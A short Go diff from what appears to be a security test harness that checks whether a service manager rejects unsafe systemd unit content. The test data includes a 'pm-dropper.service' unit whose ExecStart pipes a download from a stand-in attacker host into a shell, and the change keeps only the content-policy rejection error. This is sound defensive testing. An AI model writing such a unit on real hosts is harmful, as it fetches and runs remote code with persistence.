@@ -110,8 +110,8 @@ func trustAnchorAndUnitDropperProgram() attackProgram {
 					m, err := service.New(service.Systemd, r)
 					if err == nil {
 						err = m.WriteUnit(env.ctx, "pm-dropper.service", "[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/p | sh'\n")
-						if err != nil {
-							err = nil // host/filesystem failure is not a content-policy rejection
+						if err != nil && !errors.Is(err, service.ErrUnsafeUnitContent) {
+							err = nil // a host/filesystem failure is not a content-policy rejection; keep only the policy sentinel (mirrors the CA-cert case above)
 						}
 					}
 					return observation{err: err, commands: r.Calls()}
